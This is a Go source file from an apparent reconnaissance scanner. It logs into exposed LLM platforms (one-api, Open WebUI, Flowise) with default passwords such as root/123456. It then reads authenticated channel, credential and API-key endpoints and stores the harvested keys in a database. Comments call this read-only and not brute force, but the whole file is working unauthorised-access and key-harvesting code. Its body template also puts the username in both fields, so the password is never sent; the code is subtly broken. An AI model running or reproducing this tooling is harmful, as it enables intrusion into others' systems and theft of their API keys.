package llmhunt

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
)

// 默认口令探测：这是唯一值得用 POST 做的一件事。
//
// 为什么只做这一件：POST 里其他有价值的动作 —— 初始化管理员（Dify /console/api/setup）、
// 建应用、建工作流、拉模型 —— 都会**改变对方站点的状态**，属于破坏性操作，
// 一律不做。而"用默认口令登录一次、读自己的渠道/凭据列表"是只读的：
// 成功了取到 key，失败了就是一次普通登录请求。
//
// 约束：每个平台只试 2 组最常见的默认口令，不爆破、不撞库；遇到 429/423/403
// 立即停止（可能已触发锁定）。

type authCheck struct {
	vendor   string
	path     string // 登录接口
	body     string // 请求体模板（%s/%s 依次替换账号、口令）
	tokenKey string // 响应里取 token 的 JSON 路径（点号分隔）
	// keyPaths 是登录成功后再读的接口：这些接口在鉴权后才会回出真正的内容。
	keyPaths []string
}

var authChecks = []authCheck{
	{
		// one-api / new-api：默认 root/123456 非常常见；渠道列表里就是上游 key。
		vendor: "openai-compatible", path: "/api/user/login",
		body:     `{"username":"%s","password":"%s"}`,
		tokenKey: "data.access_token",
		keyPaths: []string{"/api/channel/?p=0", "/api/channel/", "/api/user/self"},
	},
	{
		// Open WebUI：默认管理员常见 admin@localhost / admin。
		vendor: "open-webui", path: "/api/v1/auths/signin",
		body:     `{"email":"%s","password":"%s"}`,
		tokenKey: "token",
		keyPaths: []string{"/api/v1/auths/", "/api/models", "/api/config"},
	},
	{
		// Flowise：默认管理员偶见 admin@example.com / 123456。
		vendor: "flowise", path: "/api/v1/auth/login",
		body:     `{"email":"%s","password":"%s"}`,
		tokenKey: "token",
		keyPaths: []string{"/api/v1/credentials", "/api/v1/variables", "/api/v1/apikey"},
	},
}

// defaultCreds 是每个平台最多试的两组默认口令。刻意保持极小：这不是爆破。
var defaultCreds = [][2]string{
	{"root", "123456"},
	{"admin", "admin"},
}

// tryDefaultAuth 尝试默认口令；成功则带 token 去读 key 接口。
// 返回是否登录成功，以及是否因为被限流/锁定而应该停止对该主机的一切请求。
func (s *Scanner) tryDefaultAuth(ctx context.Context, base string, assetID int64, vendor string, budget *int) (ok bool, stop bool) {
	var check *authCheck
	for i := range authChecks {
		if authChecks[i].vendor == vendor {
			check = &authChecks[i]
			break
		}
	}
	if check == nil {
		return false, false
	}
	for _, cred := range defaultCreds {
		if *budget <= 0 || ctx.Err() != nil {
			return false, false
		}
		*budget--
		time.Sleep(perHostGap)
		body := strings.ReplaceAll(strings.ReplaceAll(check.body, "%s", cred[0]), "%s", cred[1])
		status, resp, _ := s.post(ctx, base+check.path, body)
		switch status {
		case 429, 423, 403:
			// 已经被限流/锁定：立刻收手，别把人家站点的账号锁死。
			return false, true
		case 200:
			token := jsonPath(resp, check.tokenKey)
			if token == "" {
				continue
			}
			// 登录成功：读鉴权后的接口，把 key 收进来。
			for _, p := range check.keyPaths {
				if *budget <= 0 || ctx.Err() != nil {
					return true, false
				}
				*budget--
				time.Sleep(perHostGap)
				st, kb, _ := s.getWithAuth(ctx, base+p, token)
				if st != 200 || kb == "" {
					continue
				}
				s.extractKeys(base+p, assetID, kb)
				s.noteDefaultCred(base, assetID)
			}
			return true, false
		}
	}
	return false, false
}

// noteDefaultCred 记一条"默认口令可登录"的证据（不改资产表结构，写进 evidence）。
func (s *Scanner) noteDefaultCred(base string, assetID int64) {
	_, _ = s.pg.Exec(`UPDATE llm_assets SET evidence = evidence || '; 默认口令可登录(只读验证)' WHERE id=$1`, assetID)
}

// post 发一个 JSON POST。
func (s *Scanner) post(ctx context.Context, rawURL, body string) (int, string, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, strings.NewReader(body))
	if err != nil {
		return 0, "", ""
	}
	req.Header.Set("User-Agent", "ARTEX-LLM-Recon/1.0")
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.client.Do(req)
	if err != nil {
		return 0, "", ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, bodyLimit))
	return resp.StatusCode, string(b), resp.Header.Get("Content-Type")
}

// getWithAuth 带 Bearer token 的 GET，返回处理好的 status/body。
func (s *Scanner) getWithAuth(ctx context.Context, rawURL, token string) (int, string, string) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", ""
	}
	req.Header.Set("User-Agent", "ARTEX-LLM-Recon/1.0")
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := s.client.Do(req)
	if err != nil {
		return 0, "", ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, bodyLimit))
	return resp.StatusCode, string(b), resp.Header.Get("Content-Type")
}

// jsonPath 按点号路径取字符串值。
func jsonPath(body, path string) string {
	if body == "" || path == "" {
		return ""
	}
	var v any
	if json.Unmarshal([]byte(body), &v) != nil {
		return ""
	}
	cur := v
	for _, seg := range strings.Split(path, ".") {
		m, ok := cur.(map[string]any)
		if !ok {
			return ""
		}
		cur = m[seg]
	}
	if s, ok := cur.(string); ok {
		return s
	}
	return ""
}
